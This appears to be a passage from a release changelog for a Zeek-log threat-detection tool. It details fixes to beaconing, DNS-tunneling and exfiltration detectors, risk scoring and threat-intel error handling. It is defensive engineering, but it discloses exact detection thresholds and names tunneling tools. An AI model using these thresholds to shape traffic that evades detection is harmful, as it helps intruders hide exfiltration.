  worse. Now identity below raw=75 (preserves single-/few-
  detector hosts at their unscaled scores — same shape goldens
  exercise) and asymptotic 75 + 24 × (1 − exp(−(raw−75)/50))
  above. Resolution preserved at the high end: raw=100 → 84,
  raw=150 → 94, raw=200 → 97, raw=400 → 99. Severity bucketing
  in `aggregateRisk` unchanged.

- **Host Risk Score timestamp now picks chronologically
  earliest contributing detector (NEW-11).** Pre-fix the
  timestamp was set on first-encountered (slice iteration
  order), so a host whose first detector emit was at 12:00:15
  stamped the roll-up `12:00:15` even when an earlier 12:00:00
  TI hit also contributed. Lexicographic compare on the
  `"YYYY-MM-DD HH:MM:SS UTC"` format is chronological. One
  golden updated (`ti_misp_feed`: `12:00:15` → `12:00:00`).

- **Watch full/incremental boundary now respects operator
  timezone (NEW-12).** Pre-fix the boundary was hard-coded to
  UTC, so an operator in (e.g.) America/Los_Angeles saw the
  "first full run of the day" fire at 5 PM local in winter / 4
  PM in summer instead of midnight, and day-boundary anchored
  statistics (beacon mean interval, exfil aggregation) split
  across two operator-local days even when no actual day
  change had happened from their perspective. Same
  `operatorLocation()` helper the findings filter (NEW-4) and
  off-hours detector use.

- **`moveFile` non-EXDEV errors no longer fall through to copy
  fallback (NEW-13).** Pre-fix the EXDEV check was an empty
  else-if body, so any rename failure (permission denied on
  dst, source vanished mid-archive, dst exists) fell through
  to the copy path and either silently masked the real failure
  or produced a misleading second error from `os.Open`. Fall-
  back now gated to `errors.Is(err, syscall.EXDEV)` explicitly;
  every other error short-circuits with the real `os.Rename`
  diagnostic intact.

- **`riskWeights` design rationale recorded.** Audit asked
  whether weights should be operator-configurable. Documented
  why no: per-detector thresholds (in `Config`) are tuned to
  the noise floor of the operator's traffic; risk weights
  encode the *relative* danger of detection types across
  deployments. Letting operators tune them locally would
  silently desynchronize roll-up scores between installs and
  make feed-shared incident discussions ("we saw a host risk
  80 spike") useless. Audit 2026-05-10 LOW.

### Detection changes

- **Host Risk Score now grows asymptotically above raw=75
  instead of clamping at 99.** Pre-fix two saturated hosts
  (raw=120 vs raw=300) both reported `99` and analysts couldn't
  rank them; post-fix the same hosts report 88 vs 98 — relative
  ordering preserved at the high end. Identity below raw=75 so
  single-/few-detector hosts (the common shape) keep their
  unscaled scores and existing alerting tuned to those values
  is unchanged. Severity bucketing (`≥75 CRITICAL`, `≥50 HIGH`,
  `≥25 MEDIUM`) unchanged. NEW-10.

- **Host Risk Score timestamp now picks the chronologically
  earliest contributing detector's timestamp.** Pre-fix slice
  iteration order, so the roll-up's "first observed" stamp was
  whichever detector emitted first on disk — could be a 12:00:15
  HTTP detection when a 12:00:00 TI hit also contributed. One
  golden updated. NEW-11.

- **DNS Tunneling entropy signal now gated on label length.**
  Pre-fix the entropy floor at 3.5 bits Shannon fired regardless
  of label length, which trapped legitimate compound English
  labels of length 20-30 — SaaS verification tokens like
  `google-site-verification` (24 chars, ent 3.61),
  `atlassian-domain-verification` (29 chars, ent 3.62),
  `stripe-verification` (19 chars, ent 3.51). Compound English
  has higher per-char entropy than long base32 streams because
  the alphabet is less constrained. New
  `dnsEntropyMinLabelLen = 30` constant gates the entropy
  signal so it only fires on labels long enough to plausibly
  carry a tunnel payload. Real tunnel labels are
  long-by-construction (channel capacity + base32/base36
  encoding overhead), so the 30-char floor removes the false-
  positive band without losing real coverage. The
  label-length-alone signal at `DNSTunnelLabelLen=50` still
  catches the long-but-low-entropy edge case independently.
  Observed during v0.9.0 fixture work; deferred to here so the
  fix could ship with its own regression coverage.
  `dns_txt_legitimate` fixture expanded to include the three
  SaaS verification tokens that previously had to be excluded;
  golden remains the empty array.

## [v0.10.0] — 2026-05-10

Second audit-driven correctness release in two days. Six new
issues surfaced by the 2026-05-10 external review (third pass on
the codebase) plus the deferred Bug 3 from v0.9.0. The auditor's
meta-point landed harder than any single bug: the v0.9.0 parser
trust-fix should have generalised "where else do we swallow
errors and infer no-result?" The TI HTTP clients were doing
exactly that (NEW-1) — same lesson, different surface. That
discipline gap is recorded in MATURATION_PLAN section 8.

### Added

- **`Analyzer.TIErrors()` API + SSE status surface for TI source
  failures.** Mirrors `ParseErrors()` from v0.9.0. Pre-fix every
  external HTTP client (OTX, AbuseIPDB, Feodo Tracker, URLhaus)
  silently treated non-2xx responses as "no hit" — JSON decoded
  into the empty struct, count == 0 → operator saw a clean
  finding-detail panel and concluded the dataset was clean when
  the upstream had returned 401 (bad key), 429 (rate limited),
  or 503 (upstream sick). New `recordTIError(source, err)` helper
  accumulates failures on the analyzer and pushes them through
  the SSE status banner (`"TI warning: <source> — <err> (results
  may be incomplete)"`). Trust-bug class generalised from the
  v0.9.0 parser path. Audit 2026-05-10 NEW-1.

- **`files_drive_by_outbreak` regression fixture.** Three
  internal hosts download `malware.exe` from one external
  sender. Pre-fix the dedup key used the sender, collapsing the
  three victims to one finding. Post-fix yields three findings,
  one per victim — see NEW-2 below.

### Changed

- **`extractHost` now uses `net/url.Parse` for URL parsing.**
  The hand-rolled trim chain mishandled `user:pass@host` URLs:
  the early colon in the userinfo confused the port-strip step
  ("only one colon before the last colon") and left
  `user:pass@evil.com` unmatched against URLhaus / feed buckets.
  Edge case for malware URLs but fragile. Falls back to the
  legacy chain (with an added `@`-strip) for scheme-less inputs
  that `net/url.Parse` won't recognise as URLs. Audit 2026-05-10.

- **Login form lowercases the email before authenticating.**
  Registration already lowercased; login relied on the SQL's
  `COLLATE NOCASE` for case-insensitive match. Anyone removing
  the COLLATE clause thinking emails were normalised at write
  time would silently break login. Now consistent at both
  edges. Audit 2026-05-10.

### Removed

- **`Analyzer.httpUIDIndex` dead state.** Same shape as the
  `st.total` cleanup in v0.9.0: the map was written for every
  HTTP request via `a.httpUIDIndex[uid] = httpEntry{...}` but
  never read anywhere. Wasted one map entry per HTTP record
  for a feature that didn't exist. The `httpEntry` type goes
  with it. If a real cross-protocol pivot against `http.log`
  emerges later, the right shape is to mirror `sslUIDIndex` and
  reintroduce intentionally. Audit 2026-05-10.

### Fixed

- **TI HTTP clients now check `resp.StatusCode` and surface
  failures (NEW-1).** Per the new TIErrors API above. The four
  package-level functions (`fetchFeodo`, `fetchURLhaus`,
  `checkOTX`, `checkAbuseIPDB`) became methods on `*Analyzer` so
  they can route failures through `recordTIError`. Decode errors
  also flow through the same path now (pre-fix decode-fail and
  no-hit were indistinguishable to the caller).

- **`analyzeFiles` dedup no longer swallows multi-victim
  drive-by outbreaks (NEW-2).** Pre-fix the dedup key was
  `(sender, filename+mime)`, so 100 internal victims downloading
  the same file from one external sender collapsed to one
  finding (whichever was logged first). Audit framed the
  variable naming as the footgun: `src` held the sender
  (`tx_hosts`) but the finding's `SrcIP` was the receiver, so a
  fast read of "key uses src, finding uses SrcIP" missed the
  inversion. Variables renamed to `sender` / `receiver` and the
  dedup key now uses the receiver, matching `checkFileHashes`'s
  `(rx, hash)` convention next door. New
  `files_drive_by_outbreak` golden asserts three findings on
  three victims of one outbreak.

- **`isIPAddr` 3-dot heuristic replaced with `net.ParseIP`
  (NEW-3).** The dot-counting heuristic treated any string with
  exactly 3 dots as an IP. Real-world casualties:
  `cdn.staging.example.com`, `subdomain.team.acme.io`,
  `mail.engineering.example.org` — all 3-label FQDNs — were
  routed to the IP bucket and never matched against URLhaus
  hosts or feed domains, so a malicious 3-label hostname on
  URLhaus silently missed. One-line fix. Audit 2026-05-10.

- **Findings filter respects the operator timezone (NEW-4).**
  Pre-fix `parseFindingTime` used `time.Parse` (UTC by default)
  for HTML datetime-local strings, so a Tampa operator entering
  "9:00 AM" got findings between 04:00–12:00 UTC (i.e. the
  previous local day evening through next local morning). The
  off-hours detector already honoured `cfg.Timezone`; the
  findings filter didn't. Now consistent. Caller passes the
  operator's `*time.Location`; analyzer-emitted Timestamp
  parsing still uses UTC. New `Server.operatorLocation()`
  helper. Audit 2026-05-10.

- **`parseIPMatcher` substring fallback gated on hostname shape
  (NEW-5).** Pre-fix typing `1` in the Src IP filter
  substring-matched every finding whose IP contained a 1 (most
  of the dataset). Same problem with any partial-IP-being-typed.
  The substring fallback (which exists to support hostnames in
  the SrcIP/DstIP fields for unresolved records) now requires at
  least one ASCII letter — purely numeric inputs that aren't
  valid IPs/CIDRs return nil (no filter applied) instead of
  matching everything. Audit 2026-05-10.

- **`Strobe` / `Exfil` / `Lateral Movement` / `Off-Hours
  Transfer` detectors now partition by sensor (NEW-6).** v0.8.0
  added sensor to `pairKey` for beacons; the four other conn-
  level detectors kept their `(src, dst)` keys. A Quiver
  deployment with overlapping sensor captures was double-
  counting strobe records, summing exfil bytes across sensors,
  and emitting one Lateral Movement / C2 Port finding per
  sensor for the same connection — thresholds calibrated on
  single-sensor traffic spuriously tripped. Single-sensor
  deployments unchanged (sensor field is constant); multi-
  sensor overlapping deployments stop double-counting. Audit
  2026-05-10. The asymmetry with beacons is now resolved.

- **`notice.go` truncation is rune-aware.** The previous byte-
  slice at index 197 could land mid-multi-byte-character on
  UTF-8 input and the trailing ellipsis would produce invalid
  UTF-8. New `truncateRunes` helper iterates runes. Audit
  2026-05-10 cosmetic.

### Detection changes

- **TI source coverage is now legible.** Pre-fix any non-2xx
  response from OTX / AbuseIPDB / Feodo Tracker / URLhaus
  silently became "no hit" downstream. Post-fix the same
  failure surfaces in the SSE status banner during the run and
  is retrievable via `Analyzer.TIErrors()` afterwards. The set
  of *findings emitted* doesn't change for clean upstream runs;
  the change is that incomplete coverage stops being invisible.

- **`analyzeFiles` emits one finding per (victim, file) instead
  of one per (sender, file).** Multi-victim drive-by outbreaks
  now produce one Suspicious File Download per victim — a
  change in count of findings emitted on the same input.
  Single-victim scenarios unchanged. Re-baseline alerting that
  was tuned to the under-counted pre-fix volume.

- **DNS Tunneling firing population narrows — the qtype-alone
  path is gone.** Pre-fix any TXT/NULL query produced a finding;
  post-fix only queries with structurally tunnel-shaped labels
  (long, high-entropy, or deeply nested) fire. Real DNS tunneling
  tools (iodine, dnscat2, Cobalt Strike's DNS beacon) couple
  TXT/NULL with long high-entropy labels because that's the
  channel capacity, so the surviving length / entropy / depth
  signals keep coverage on real attacks. Re-baseline DNS
  Tunneling alerting in any environment where the false-
  positive flood was being filtered downstream — the upstream
  now does the filtering. Bug 3 was deferred from the v0.9.0
  audit for design work; option A (drop outright) shipped per
  the auditor's explicit endorsement. See TODO 1f for the four
  alternatives that were considered (gate on second signal,
  volume detector, apex allowlist, behavior-based gate).
  `dns_tunneling` golden rewritten to a realistic 60-char base32
  label (now scores 83 vs the prior 64 because length+entropy
  combine); new `dns_txt_legitimate` fixture asserts the empty
  array on 17 realistic SPF/DKIM/DMARC/ACME queries.

### Breaking

- **`/api/findings?src_ip=...` and `?dst_ip=...` no longer
  substring-match purely numeric inputs.** Pre-fix any input was
  routed through the substring fallback when not a valid IP/CIDR;
  numeric partials (`1`, `19`, `192.168`) matched every finding
  containing the digits. Now those return no matcher (filter not
  applied). Hostname-shaped inputs (containing at least one
  letter) still substring-match the SrcIP/DstIP fields.
  External scripts that were using purely numeric substring
  searches will need to switch to either a complete IP/CIDR or
  a hostname-shaped query.

## [v0.9.0] — 2026-05-10

Audit-driven correctness release. The 2026-05-10 external review
surfaced six issues that span the conn analyzer, the DNS analyzer,
and the parser layer. Five resolved here (Bug 3, the TXT/NULL
single-signal DNS Tunneling false positive, deferred for design
work). Plus the cosmetic items the auditor flagged and three new
regression fixtures so this class of bug doesn't recur silently.

### Added

- **`Analyzer.ParseErrors()` API.** Returns the list of files that
  failed to parse during the analysis pass with the underlying error
  string per file. Intended for higher-level callers (web UI, future
  CLI) to surface a "this analysis didn't see everything" indicator
  to operators rather than reporting a finding count that implies
  cleanly-parsed-the-whole-corpus when the parser had bailed
  mid-file. Empty slice on a clean run.

- **Regression fixtures for the audit's failure modes.**
  `internal/analysis/testdata/zeek/scrambled_beacon/` exercises a
  30-connection beacon with one out-of-order record (multi-sensor
  clock-drift simulation) — pre-Bug-1-fix the bogus rewound `lastTs`
  poisoned the next valid interval, dragging `ts_score` down for a
  textbook beacon; the fixture's golden captures the post-fix
  `ts=1.00` state.
  `internal/analysis/testdata/zeek/dns_psl_apex/` exercises 60
  distinct `.co.uk` registrable domains plus six `.com.au` / `.ac.jp`
  ones — pre-Bug-6-fix all 60 lumped under apex `co.uk` and tripped
  `DNSUniqueSubdomainMin: 50`, emitting a HIGH-severity DNS
  Tunneling false positive against the public suffix itself; the
  fixture's golden is the empty array (post-fix correctly buckets
  per registrable domain). Auditor explicitly noted that golden
  fixtures with perfectly-ordered timestamps and high connection
  counts hid this entire class of bug; these fixtures invert that.
  `internal/parser/zeeklog_test.go` covers the Bug 4 oversized-line
  behavior at the parser level: a 2 MiB record now parses cleanly,
  a 17 MiB record (past the new 16 MiB ceiling) returns a non-nil
  error rather than silently truncating.

### Changed

- **Parser scanner buffer raised from 1 MiB to 16 MiB; per-file
  parse errors now propagate.** External review (2026-05-10) framed
  this as the most important issue of the audit — a "trust bug,"
  not a detection bug. Pre-fix every analyzer used
  `_ = parser.ParseLog(...)`, discarding the error. A single record
  longer than the 1 MiB scanner buffer (large HTTP POST URI,
  base64-encoded upload, fat `set[string]` field, JSON record with
  hundreds of services) returned `bufio.ErrTooLong` from the parser
  and the analyzer silently truncated the file at the long line.
  The analyst saw a finding count that implied the whole capture
  had been processed when the parser had bailed mid-file. Modern
  HTTP captures regularly exceed 1 MiB on a single record.
  Considered: streaming JSON decode (rejected as scope creep — the
  buffer raise covers realistic captures and the streaming work
  belongs in a future release if 16 MiB ever proves insufficient).
  Shipped: 16 MiB ceiling on the scanner buffer, plus a new
  `Analyzer.parseLog` helper that surfaces failures via the SSE
  status channel (`"Parser warning: <file> — <err> (file
  partially read)"`) and accumulates them on the analyzer for
  end-of-run reporting through the new `ParseErrors()` API. Every
  swallow site in `internal/analysis/` migrated to the helper. The
  raw-log pivot endpoint (`internal/server/findings_raw.go`) logs
  per-file failures to the server log instead.

- **Settings section "Threat Intelligence" renamed to "Threat Intel
  Lookup APIs".** Operator question raised whether the per-finding
  enrichment keys (VirusTotal, AbuseIPDB, OTX, CrowdSec, GreyNoise,
  Censys) should move into the Feeds dialog alongside MISP/OpenCTI
  for one-stop TI configuration. Considered: consolidating into the
  Feeds dialog as a second zone. Preserved: the split between
  detection-input feeds (bulk indicator pulls on a watch cadence)
  and lookup APIs (per-finding analyst pivots), since they have
  different operational shapes and the Feeds dialog's CRUD-row UI
  doesn't fit flat key-value config. Shipped: the cheaper rename
  plus a one-line helper text pointing operators at the Feeds
  dialog if they're looking for bulk-indicator sources.

### Removed

- **Dead code: `Analyzer.observeWindow` method, `beaconState.total`
  and `httpBeaconState.total` fields.** External review noted both
  were defined-but-unused — `observeWindow` was never called
  (analyzers manipulate `localWindows` directly to avoid taking
  `a.mu` per record), and `total` was incremented in two places
  but never read. The actual connection-count source is
  `pairCounts[pk]`. Considered: migrating analyzers to call
  `observeWindow` for single-point-of-control. Rejected: that path
  forces a mutex acquisition per record on the hot loop, regressing
  performance for an aesthetic gain. Deletion is the right call.

### Fixed

- **Out-of-order timestamps no longer rewind `lastTs` and poison
  the next valid interval.** External review (2026-05-10) flagged
  this in both `conn.go` and `http_analysis.go`. Pre-fix
  `st.lastTs = ts` ran unconditionally even when `ts < st.lastTs`;
  the skip-recording branch correctly avoided sampling the negative
  interval, but the assignment still rewound `lastTs` to the earlier
  value. The next valid forward record then computed its interval
  against the rewound timestamp, sampling an inflated bogus value
  into the timing reservoir. Real-world triggers: multi-sensor
  capture merges with clock drift, rotated logs processed out of
  mtime order, and Zeek's own connection-close-time logging which
  emits records out of strict order at high load. Fix is the
  forward-only guard around the assignment, matching the guard that
  was already protecting the interval recording.

- **Lazy-init beacon-state replay now back-fills every dimension,
  not just intervals.** External review framed this as the same
  class of bug as the v0.8.0 lazy-init fix: that fix addressed the
  framing of the prior auditor's critique (timing-axis intervals)
  without addressing what the critique was about (data fidelity for
  borderline beacons). The lazy-init guard at conn 3 dropped
  connections 1 and 2's contribution to *every* axis, not just
  `ivs`. Pre-fix `firstTs` reported conn 3's timestamp (analyst
  chasing "when did this start" got the wrong answer), `minTs` was
  used by `durationScoreFromHourMap` for coverage so the duration
  span was 2 connections too narrow, `byteVals` (data-size axis)
  ran on N-2 samples while the finding still claimed N, `hourMap`
  (histogram axis) was missing two buckets, and `tsData` (Beacon
  Chart) was missing the first two data points. For a beacon at
  exactly `BeaconMinConnections=10` that's 20% of every axis
  silently dropped. Fix: `preBeaconTs map[pairKey][]float64`
  becomes `preBeaconRecs map[pairKey][]preBeaconRec` carrying
  full `(ts, origB, respB)` triples; the replay path now touches
  `firstTs`, `minTs`, `maxTs`, `ivs`, `byteVals`, `tsData`, and
  `hourMap`. Same fix in HTTP beacon path. The `Timestamp` shift
  on existing goldens (`strobe`, `beacon_url`, `http_beacon`,
  `multimode_beacon`) reflects the corrected `firstTs` semantic.

- **DNS NXDOMAIN-flood `Timestamp` no longer poisoned by an initial
  `ts == 0`.** External review noted same class as the
  out-of-order bug: pre-fix `nxFirst[src]` could be set to 0 on a
  leading record with a missing `ts` field, after which any valid
  forward timestamp failed the `ts < nxFirst[src]` comparison and
  never updated. The NXDOMAIN Flood finding then reported
  `Timestamp: ""`. Fix is the same `ts > 0` guard pattern
  `apexMap[k].firstTS` already used in the next block down.

- **DNS apex extraction now uses the Mozilla Public Suffix List.**
  External review flagged that the `labels[len-2:]` heuristic
  treated `.co.uk`, `.com.au`, `.ac.jp`, `.gov.cn` as bare apexes,
  bucketing every host under the public suffix into a single
  diversity counter. UK-heavy environments tripped
  `DNSUniqueSubdomainMin: 50` against `co.uk` itself trivially —
  HIGH-severity DNS Tunneling false positives that buried any real
  tunneling under the noise. Fix: new `apexFromQuery` helper calls
  `golang.org/x/net/publicsuffix.EffectiveTLDPlusOne` (Mozilla's
  canonical PSL binding, already in our indirect deps); falls back
  to the legacy heuristic only when the PSL doesn't recognise the
  input as a public name. Promotes `golang.org/x/net` from
  indirect to direct.

- **Misleading `seenPerQuery` map name in `dns.go` renamed to
  `seenTunnel`.** Audit noted the key shape was `[2]string{src,
  apex}` so the map deduplicates per (src, apex) for tunneling
  findings, not per query. Pure rename, no behavior change.

- **Off-hours config validation: `OffHoursStart == OffHoursEnd`
  now rejected at PUT time.** Pre-fix the wraparound branch
  (`start > end`) was false and the standard branch
  (`hour >= X && hour < X`) was always false, silently disabling
  off-hours detection without any operator signal. New
  `/api/config` PUT validation rejects equal values with HTTP 400
  and a descriptive error. Out-of-range start/end (outside `[0,23]`)
  also now rejected. See `### Breaking` below.

### Detection changes

- **Beaconing/HTTP-Beaconing `Timestamp` field reports the first
  connection's true ts, not conn 3's.** A direct consequence of
  the lazy-init replay fix above. Visible on the existing golden
  fixtures: `strobe` `Timestamp` shifted from `12:00:38` to
  `12:00:00`, `beacon_url` from `12:02:00` to `12:00:00`,
  `http_beacon` from `12:02:00` to `12:00:00`, `multimode_beacon`
  from `12:02:01` to `12:00:00`. Score is unchanged on the
  already-deterministic high-volume fixtures (`strobe`,
  `beacon_url`, `http_beacon`); `multimode_beacon` shifted from
  54 → 53 because the now-correct full-record contribution to
  byte-size and hour-bucket axes adjusts `ds_score` (0.96 → 0.97)
  and `hist_score` (0.24 → 0.19) on a 40-connection fixture where
  the missing 2 records were 5% of the data. Direction is
  uniformly toward correctness. Re-baseline any min-score alerting
  that was tuned to the pre-fix scores on at-or-near-threshold
  beacons.

- **Out-of-order capture timestamps now produce correct interval
  reservoirs.** Multi-sensor merges with clock drift and
  high-load Zeek captures with close-time records produce out-of-
  order timestamps. Pre-fix any such occurrence dragged `ts_score`
  down via the rewound-`lastTs` poisoning. Post-fix the
  out-of-order records contribute nothing to interval timing
  (they still increment connection counts and other axes). On
  cleanly-ordered captures there is no change. On out-of-order
  captures `ts_score` rises toward the correct value.

- **DNS Tunneling no longer fires false positives against
  multi-component public suffixes.** PSL apex extraction means
  `.co.uk`, `.com.au`, `.ac.jp`, etc. environments stop emitting
  HIGH-severity DNS Tunneling findings against the public suffix
  itself. Conversely, real DNS tunneling under e.g. `evil.co.uk`
  now correctly accumulates diversity within its own
  `evil.co.uk` apex bucket rather than being smeared across all
  `.co.uk` traffic. Re-baseline diversity-based DNS Tunneling
  alerting in non-US environments — false-positive volume drops
  meaningfully and any true positives that were being masked by
  the noise should surface cleanly.

### Breaking

- **`/api/config` PUT now rejects `off_hours_start == off_hours_end`
  with HTTP 400.** Pre-fix equal values silently disabled
  off-hours detection. External scripts that uploaded a config
  with equal values to "disable" off-hours will need a different
  approach (set start to a time the analyst's traffic doesn't
  fall into, or wait for a future explicit `off_hours_enabled`
  flag). Out-of-range start/end (outside `[0,23]`) also now
  rejected.

## [v0.8.0] — 2026-05-10

### Added

- **Type-sharded parallel MISP fetch with larger pages.** A full
  MISP pull no longer issues one big restSearch query covering all
  seven attribute types — instead it dispatches one query per type
  (`ip-src`, `ip-dst`, `domain`, `hostname`, `md5`, `sha1`,
  `sha256`) and runs them in parallel, capped at four in flight at
  once. Each shard restarts pagination from page 1 of just its
  type, so the offset-pagination cost that used to push deep pages
  to multi-second responses gets distributed across seven shallower
  walks running concurrently. Hardcoded concurrency=4 is sized for
  a 6-core single-VM MISP — leaves headroom for Apache, the OS, and
  background MISP work while still bringing wall-clock down
  meaningfully on large feeds. Single-feed PageSize default raised
  from 10 000 to 25 000 attributes per page; fewer round trips per
  shard with no measurable memory pressure on either side. First
  shard error cancels the rest via context and is surfaced to the
  feeds dialog. Tests cover the request fanout, the concurrency
  cap, and the per-shard `timestamp` filter pass-through under the
  race detector.

- **Incremental MISP feed sync.** Watch-tick feed refreshes now use
  MISP's `restSearch` `timestamp` filter to fetch only attributes
  modified since the previous run, instead of paginating the full
  snapshot every time. On feeds with hundreds of thousands of
  attributes, restSearch's offset pagination degrades from ~150ms at
  page 1 to several seconds at page 100; cutting the result set down
  with the `timestamp` filter keeps the fetch in the cheap
  shallow-page region. New `last_full_refresh_at` column on the
  `feeds` table tracks the most recent full pull separately from
  `last_refresh_at` (which now records any kind of fetch). The
  scheduler picks full vs incremental per-feed based on the
  full-refresh cadence: half the configured aging window with a
  24-hour floor, or weekly when aging is disabled. The cadence is
  sized below the aging window so unchanged-but-still-current
  indicators get `last_seen` bumped before the aging sweep would
  delete them. Aging-prune runs only on full pulls. The per-row
  Refresh button on the admin Feeds dialog is unchanged in shape but
  now always forces a full pull — operators clicking Refresh are
  asking for verification, not a cheap delta. The Feeds row's
  refresh-time cell gains a tooltip showing the last full refresh
  timestamp so operators can tell which fetches were cheap
  incrementals vs the periodic deep sync. OpenCTI's adapter accepts
  the `since` argument to satisfy the new interface but ignores it
  for now — its cursor pagination doesn't suffer from the
  offset-degradation problem MISP's does, so the urgency is lower.

- **Live indicator-count progress in the Feeds dialog.** While a feed's
  `status` is `fetching` the row now shows the running `feed_indicators`
  row count for that feed (e.g. `184,237 ingesting…`) instead of the
  stale `last_indicator_count` from the previous settled fetch. The
  Feeds dialog auto-polls `/api/feeds` every 2.5 s while open, so a
  long MISP import that's been paginating for tens of minutes shows
  visible progress instead of a yellow `fetching` pill that never
  changes. New `live_indicator_count` field on the `/api/feeds`
  response, backed by a single `SELECT feed_id, COUNT(*) … GROUP BY
  feed_id` query per request. Settled feeds keep showing the existing
  `last_indicator_count` exactly as before.

- **Jittered-single-mode beacon detection via interval entropy.** A
  new `intervalEntropyScore` helper bins intervals on a log2 axis
  and computes Shannon entropy of the bin counts, normalised against
  `log2(nBuckets)`. A beacon at 60s ± 50% jitter scores poorly on
  Bowley + MAD (deviations are large relative to the median) but
  every interval still lands in the same one or two log2 buckets,
  so entropy stays low and the score stays high. Wired into the
  timing-axis composite as `tsScore = max(raw, multimodal, entropy)`,
  so single-mode tight beacons (where all three score ~1) and
  multi-period beacons (where multimodal already rescues) are
  unaffected. Existing golden fixtures pass without re-baseline
  because none of them exercise the jittered-single-mode case.
  See `docs/DETECTION_METHODS.md` § 2.2(a) for the math.

- **Multi-period beacon detection on the timing axis.** A new
  `intervalMultimodalScore` helper rescues beacons whose intervals
  cluster around 2–4 distinct values (heartbeat + tasking, idle +
  active, etc.) — those would otherwise be under-scored by Bowley
  and MAD applied to the raw distribution. Algorithm: log2-bin
  intervals, find peaks, score each peak's tightness via
  `(median − MAD) / median`, weighted-average the per-peak scores.
  Returns 0 (deferring to the existing math) for single-mode
  distributions, ≥5-mode distributions (too noisy), or any peak
  loose enough to score below 0.5. Caller takes `max(raw, multimodal)`,
  so single-mode beacons are unaffected. New
  `multimode_beacon` golden fixture exercises a 60s-heartbeat plus
  600s-tasking pattern and demonstrates the rescue: `ts=0.99` lifts
  the Beacon finding into HIGH severity (score 54) where the raw
  math would have left it well below threshold.

- **`/api/findings/{id}/position` endpoint.** Returns the absolute
  zero-indexed position of a finding within `/api/findings` under
  the same filter + sort parameters. Backs the Jump action's
  page-offset lookup; useful to any external script that wants to
  navigate to a specific finding within a paginated view.

- **HTTP Min Requests input in the Settings dialog.** The
  `http_beacon_min_requests` threshold was already documented in
  the README and read by the analyzer, but the Settings dialog
  never exposed an input for it — admins had to drive `/api/config`
  directly to tune it. New control sits next to Min Connections
  in the Beaconing section and round-trips through the same
  `/api/config` PUT the existing controls use.

### Changed

- **MISP/OpenCTI feed-fetch timeouts raised for larger deployments.**
  Manual refresh cap (`POST /api/feeds/{id}/refresh`) raised from 60s
  to 5 minutes. Watch full-pass pre-fetch cap raised from 2 minutes
  to 10 minutes. Per-page HTTP client timeout in
  `internal/feeds/misp.go` raised from 30s to 90s. Confirmed against
  a real 100k+ indicator MISP where offset-based pagination degrades
  with depth (page 1 at 0.16s, page 100 at 3.5s — total walk ~3
  minutes). The bumped caps unblock the existing full-sweep adapter;
  the principled fix (incremental sync via `timestamp` parameter,
  streaming decode, periodic full re-sync) is queued in
  MATURATION_PLAN section 11c, with a per-feed operator-supplied
  query filter as the intermediate step queued in TODO.md 1d.

### Removed

- **Four beacon-config fields that no analyzer ever read.**
  `beacon_max_jitter_cv`, `beacon_min_interval_sec`,
  `beacon_gap_multiplier`, and `http_beacon_max_cv` were
  documented in the README's threshold table as tunable knobs
  and round-tripped through `/api/config`, but referenced
  exactly twice each — once in the struct, once in the default
  — and never read anywhere in `internal/analysis/`. An
  operator who set them via the API saw them persist to SQLite
  and have zero effect on detection. Dropped from the struct,
  defaults, and README. Only `beacon_min_connections` and
  `http_beacon_min_requests` continue to gate detection (both
  remain).

### Fixed

- **`/logs/_archived/` is now excluded from the live logs tree and
  every analyze pass.** The purge bucket — where the admin **Purge
  data** action rotates a disenrolled sensor's `/logs/<name>/`
  aside to `/logs/_archived/<name>-<timestamp>/` — was leaking into
  two paths: the sidebar Logs preview tree showed `_archived` as if
  it were a sensor (`handleLogsTree`), and `scanLogsDir` walked it
  recursively so every full analyze pass re-processed purged-sensor
  data and emitted fresh findings tagged `sensor=_archived`. Both
  paths now skip the subtree, matching the convention already used
  by `disk_usage.go`. Findings tagged `sensor=_archived` from prior
  runs stay in the database (fingerprint-merge preserves them) and
  will simply stop refreshing — operators wanting them gone can
  prune via `/api/archive/run` once they age past the archive
  retention cutoff. Raw-log pivot via `/api/findings/{id}/raw` still
  searches `_archived` so analysts can review historical records on
  pre-purge findings.

- **Lazy-init beacon state no longer drops the first two intervals.**
  Per-pair `beaconState` is allocated lazily on connection 3
  (`beaconLazyMinConn = 3`) to bound memory on high-cardinality
  low-count streams. The struct literal initialised `firstTs`/`minTs`/
  `maxTs` from the current record but left `lastTs` at zero, so the
  reservoir-recording guard (`if st.lastTs > 0 && ts > st.lastTs`)
  silently skipped the first interval, and the ts values from
  connections 1 and 2 were never seen at all. Result: every beacon
  paid a two-interval tax — irrelevant on a 1000-connection stream,
  ~22% of the timing data on a 10-connection stream right at the
  detection threshold. Fix: stash the timestamps of pre-allocation
  connections in a `preBeaconTs` map; on state allocation, replay
  them so intervals 1→2 and 2→3 land in the reservoir alongside
  every later interval. Same fix applied to `analyzeHTTP`'s lazy
  init path. ~16 bytes/pair worst-case extra memory before
  allocation; freed on allocation.

- **Beacon hist + duration scoring no longer smears across sensors.**
  The conn analyzer was computing one global `(dsMin, dsMax)` capture
  window across every conn.log file in `/logs/`, regardless of which
  sensor produced it. A real beacon inside a January capture got
  scored against a window that ran from January through whatever the
  newest log in any other sensor's tree was — coverage cratered, and
  every per-pair hour-bucket collapsed into 1 of 24 global buckets,
  zeroing both the histogram and duration components (50% of the
  beacon score). Fix: each sensor (the first path component under the
  analyzer's path root) gets its own capture window, stored in
  `Analyzer.sensorWindows`, and beacon pairs carry the originating
  sensor in their map key so scoring picks up the right window. Same
  fix applied to HTTP Beaconing in `analyzeHTTP`. As a side effect the
  same `(src, dst)` from two sensors no longer merges into one beacon
  state — that latent bug went away with the pair-key change.

- **Bell-notification Jump now lands on the target finding regardless
  of filter/pagination/delta state.** Pre-fix the Jump button silently
  no-op'd when the active tab's filter excluded the target, when the
  current page didn't contain it, or when delta mode was on. The
  handler now resets every filter input (search, src/dst/port,
  severity, type, sensor, score floor, time range → All time, delta
  off), switches to the tab matching the finding's status, queries
  the new `/api/findings/{id}/position` endpoint to compute the
  absolute offset under the cleared filter, fetches the page that
  contains the finding, and scrolls the table row into view. Filters
  the analyst had set are intentionally lost — the Jump is a "show
  me this finding now" action.

### Detection changes

- **Multi-period beacon scores rise on the timing axis.** See the
  `### Added` entry for the new `intervalMultimodalScore` path.
  A beacon with a 60s heartbeat plus a 600s tasking cycle that
  scored ts≈0.59 under raw Bowley+MAD now scores ts≈0.99 — moving
  the overall composite from below detection threshold into HIGH
  severity. Single-mode beacons are unaffected (the helper
  returns 0 and the caller falls back to the existing math).
  Re-baseline any min-score alerting if your environment has
  multi-period beacons that were previously being missed.

- **Beacon `ts_score` rises slightly when intervals 1→2 and 2→3
